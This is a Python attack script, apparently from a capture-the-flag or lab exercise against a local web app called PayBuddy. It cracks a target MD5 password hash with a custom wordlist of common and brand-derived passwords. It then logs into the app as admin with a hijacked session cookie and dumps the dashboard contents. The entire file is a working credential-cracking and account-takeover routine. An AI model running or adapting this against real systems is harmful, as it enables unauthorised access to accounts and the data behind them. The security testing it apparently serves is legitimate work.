import requests
import hashlib

target_hash = "7d39307ae824e70052c0aa16816a9b16"

print("[*] Password must be at least 8 characters (client-side validation)")
print("[*] Generating 8+ character password candidates")
print("="*60)

# Generate passwords with minimum 8 characters
passwords = []

# Common 8+ char patterns
patterns_8plus = [
    'password', 'Password', 'PASSWORD', 'password1', 'password!',
    'password123', 'password12', 'password1!', 'password!1',
    'admin123', 'admin1234', 'admin12345', 'admin123!',
    'paybuddy', 'PayBuddy', 'PAYBUDDY', 'paybuddy1', 'paybuddy!',
    'paybuddy123', 'paybuddy12', 'paybuddy1!', 'paybuddy2024',
    'paybuddies', 'PayBuddies', 'PAYBUDDIES', 'paybuddies1',
    'paybuddies!', 'paybuddies123', 'paybuddies2024',
    'letmein1', 'letmein!', 'letmein123', 'letmein12', 
    'welcome1', 'welcome!', 'welcome123', 'welcome12',
    'qwerty123', 'qwerty12', 'qwerty1!', 'qwerty!1',
    '12345678', '123456789', '1234567890', '12345678!',
    'buddy123', 'buddy1234', 'buddy12345',
    'admin!23', 'admin@123', 'admin#123', 'admin$123',
    'test1234', 'test12345', 'test123!', 'test@123',
    'demo1234', 'demo12345', 'demo123!', 'demo@123',
    'user1234', 'user12345', 'user123!', 'user@123',
    'pass1234', 'pass12345', 'pass123!', 'pass@123',
    'root1234', 'root12345', 'root123!', 'root@123',
    'guest1234', 'guest12345',  'guest123!', 'guest@123',
    'login123', 'login1234', 'login12345', 'login123!',
    'secret12', 'secret123', 'secret1234', 'secret!',
    'welcome@', 'Welcome1', 'Welcome!', 'Welcome123',
    'Password!', 'Password1', 'Password@', 'Password#',
    'Admin123', 'Admin1234', 'Admin123!', 'Admin@123',
    'Paybuddy1', 'Paybuddy!', 'Paybuddy@', 'Paybuddy#',
    'PayBuddy1', 'PayBuddy!', 'PayBuddy@', 'PayBuddy#',
    'PayBuddy123', 'PayBuddy12', 'PayBuddy2024',
    'paybuddy@', 'paybuddy#', 'paybuddy$',
    'buddies1', 'buddies!', 'buddies@', 'buddies123',
    'payment1', 'payment!', 'payment@', 'payment123',
    'transfer', 'transfer1', 'transfer!', 'transfer@',
    'Transfer', 'Transfer1', 'Transfer!', 'Transfer@',
    'money123', 'money1234', 'money12345', 'money!',
    'cashflow', 'cashflow1', 'cashflow!', 'cashflow@',
    'finance1', 'finance!', 'finance@', 'finance123',
    'payroll1', 'payroll!', 'payroll@', 'payroll123'
]

passwords.extend(patterns_8plus)

# Add variations
base_words = ['paybuddy', 'paybuddies', 'password', 'admin', 'welcome', 'letmein']
for word in base_words:
    for num in range(1000, 10000, 1000):
        passwords.append(word + str(num))
    for year in [2020, 2021, 2022, 2023, 2024]:
        passwords.append(word + str(year))
        passwords.append(word.capitalize() + str(year))

# Remove duplicates and filter for 8+ chars
passwords = list(set([p for p in passwords if len(p) >= 8]))

print(f"[*] Generated {len(passwords)} passwords (8+ characters)")
print(f"[*] Testing against hash {target_hash}...")

for i, pwd in enumerate(passwords):
    hash_val = hashlib.md5(pwd.encode()).hexdigest()
    
    if hash_val == target_hash:
        print(f"\n[!] PASSWORD FOUND: {pwd}")
        print(f"[!] Hash: {hash_val}")
        print(f"[!] Length: {len(pwd)} characters")
        print(f"[!] Position: {i+1}/{len(passwords)}")
        
        # Try login
        url = "http://127.0.0.1:32892/index.php"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "http://127.0.0.1:32892",
            "Referer": "http://127.0.0.1:32892/"
        }
        cookies = {"PHPSESSID": "9b8ouneh58t3bjv346lp4s82ol"}
        
        print(f"\n[*] Attempting login with admin / {pwd}")
        data = {
            "username": "admin",
            "password": pwd,
            "submit": "submit"
        }
        
        response = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
        print(f"[*] Status: {response.status_code}")
        print(f"[*] Response: {response.text}")
        
        if "Success" in response.text:
            print("[!] LOGIN SUCCESSFUL!")
            
            # Update cookies if new ones returned
            if response.cookies:
                print(f"[*] New cookies: {response.cookies.get_dict()}")
                cookies.update(response.cookies.get_dict())
            
            # Try to access dashboard
            print(f"\n[*] Accessing dashboard...")
            session = requests.Session()
            session.cookies.update(cookies)
            
            dash_response = session.get("http://127.0.0.1:32892/dashboard.php", timeout=5, allow_redirects=True)
            print(f"[*] Dashboard status: {dash_response.status_code}")
            print(f"[*] Dashboard length: {len(dash_response.text)}")
            print(f"[*] Dashboard content:\n{dash_response.text}")
        
        break
    
    if (i + 1) % 100 == 0:
        print(f"[*] Tested {i+1}/{len(passwords)}...")

else:
    print(f"\n[-] Password not found in {len(passwords)} 8+ character passwords")

print("\n[*] Script complete")

